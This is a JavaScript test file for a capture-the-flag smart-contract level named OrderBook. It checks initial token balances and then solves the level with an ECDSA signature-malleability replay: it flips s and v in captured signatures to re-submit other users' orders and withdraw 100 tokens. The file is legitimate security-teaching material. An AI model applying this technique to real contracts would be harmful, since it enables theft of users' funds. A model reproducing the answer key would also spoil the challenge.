/*eslint no-undef: "off"*/
const ethers = require('ethers');

const OrderBookFactory = artifacts.require('./levels/OrderBookFactory.sol');
const OrderBook = artifacts.require('./levels/OrderBook.sol');
const utils = require('../utils/TestUtils');
const BigNumber = ethers.BigNumber;
const BN = Web3.utils.BN;

contract('OrderBook', function () {
  let ethernaut, level, instance, implementation;
  let users;

  let player = new ethers.Wallet(
    '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
  );
  const decimals = 18;
  const scale = new BN(10).pow(new BN(decimals));
  const encoder = new ethers.utils.AbiCoder();
  let tokens;

  beforeEach(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy();
    implementation = await OrderBook.new();
    level = await OrderBookFactory.new(implementation.address);
    await ethernaut.registerLevel(level.address);

    users = {
      Alice: generateWallet('Alice'),
      Bob: generateWallet('Bob'),
      Charlie: generateWallet('Charlie'),
      Diane: generateWallet('Diane'),
      Evelyn: generateWallet('Evelyn'),
    };
  });

  beforeEach(async function () {
    instance = await utils.createLevelInstance(
      ethernaut,
      level.address,
      player.address,
      OrderBook
    );

    tokens = await instance.getWhitelistedTokens();
  });

  describe('Initialization', async function () {
    // these are the balances after the factory has run the setup trades
    const initialScenarioBalances = {
      Alice: [70, 75, 90],
      Bob: [35, 70, 50],
      Charlie: [45, 35, 5],
      Diane: [215, 240, 80],
      Evelyn: [15, 5, 105],
    };

    Object.keys(initialScenarioBalances).map((name) =>
      initialScenarioBalances[name].map((balance, idx) => {
        it(`should give ${name} ${balance} units of token ${idx}`, async function () {
          const totalBalance = await instance.getTotalBalance(
            users[name].address,
            tokens[idx]
          );
          assert(totalBalance.eq(scale.mul(new BN(balance))));
        });
      })
    );

    it('should not be completed', async function () {
      const isComplete = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player.address
      );
      assert.equal(isComplete, false);
    });
  });

  describe('Malleability attack', async function () {
    // this is the first transaction we want to replay
    // it will force Evelyn to accept Diane's old offer, which will give Diane an extra 35 token[2]
    // so we can replay the next transaction
    // the details can be taken from the contract events
    const target0 = {
      address: '0x421244a7a8809c73a9d6806b91e322c85e9574df',
      sellIdx: 3,
      buyIdx: 1,
      sellAmount: new BigNumber.from(10).pow(decimals).mul(35),
      buyAmount: new BigNumber.from(10).pow(decimals).mul(10),
      nonce: 3,
      v: 27,
      r: '0x1036d281926e4a2b4d173ee2b3dfc90a21fd7b56b90c448108aced34e873e81f',
      s: '0x563eb8893d741a3a0de1ce5710ba1f0ba25426cb05fc36c2bcfeeb040faab0c5',
    };

    // this is the second transaction we want to replay
    // it will force Diane to offer us 100 token[2] in exchange for 80 token[1]
    // note that this is much better than current market price
    // the details can be taken from the contract events
    const target1 = {
      address: '0xb9a9B73CE551c06EEA59143B9BEdaA8195F517FF',
      sellIdx: 3,
      buyIdx: 2,
      sellAmount: new BigNumber.from(10).pow(decimals).mul(100),
      buyAmount: new BigNumber.from(10).pow(decimals).mul(80),
      nonce: 2,
      v: 28,
      r: '0x303491a774261f8aff19a3e963ac4ad70a81751f6fc2b40d3a65b4a538a2f4c1',
      s: '0x18a892cd45a22eb91b7c5393c7bce3e8a56ba3328d8531e108a5ecccb16c0d52',
    };

    beforeEach(async function () {
      const altSig0 = alternateSignature(target0.r, target0.s, target0.v);
      const altSig1 = alternateSignature(target1.r, target1.s, target1.v);

      // force Evelyn to give Diane 35 token[2]
      await instance.placeOrder(
        target0.address,
        target0.sellIdx,
        target0.buyIdx,
        target0.sellAmount,
        target0.buyAmount,
        target0.nonce,
        altSig0.v,
        altSig0.r,
        altSig0.s
      );
      // force Diane to offer 100 token[2]
      await instance.placeOrder(
        target1.address,
        target1.sellIdx,
        target1.buyIdx,
        target1.sellAmount,
        target1.buyAmount,
        target1.nonce,
        altSig1.v,
        altSig1.r,
        altSig1.s
      );
      // accept the offer
      const sellAmountBN = scale.mul(new BN(80));
      const buyAmountBN = scale.mul(new BN(100));
      const encoding = encoder.encode(
        ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'uint256'],
        [
          player.address,
          2,
          3,
          sellAmountBN.toString(),
          buyAmountBN.toString(),
          1,
        ]
      );
      const message = ethers.utils.keccak256(encoding);
      const hash = ethers.utils.arrayify(message);
      const flatSig = await player.signMessage(hash);
      const sig = ethers.utils.splitSignature(flatSig);
      await instance.placeOrder(
        player.address,
        2,
        3,
        sellAmountBN,
        buyAmountBN,
        1,
        sig.v,
        sig.r,
        sig.s
      );
      // retrieve the tokens
      await instance.withdraw(tokens[2], buyAmountBN, { from: player.address });
    });

    it('should retrieve 100 units of token 2', async function () {
      const balance = await instance.getExternalBalance(
        player.address,
        tokens[2]
      );
      assert(balance.eq(scale.mul(new BN(100))));
    });

    it('should complete the challenge', async function () {
      const isComplete = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player.address
      );
      assert.equal(isComplete, true);
    });
  });
});

function generateWallet(seed) {
  return new ethers.Wallet(
    ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`OrderBook:${seed}`))
  );
}

function alternateSignature(r, s, v) {
  // This is a property of the secp256k1 elliptic curve
  const order =
    '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141';

  return {
    r: r,
    s: new BigNumber(order).sub(s).toHexString(),
    v: 55 - v, // map 27 to 28 and vice versa
  };
}
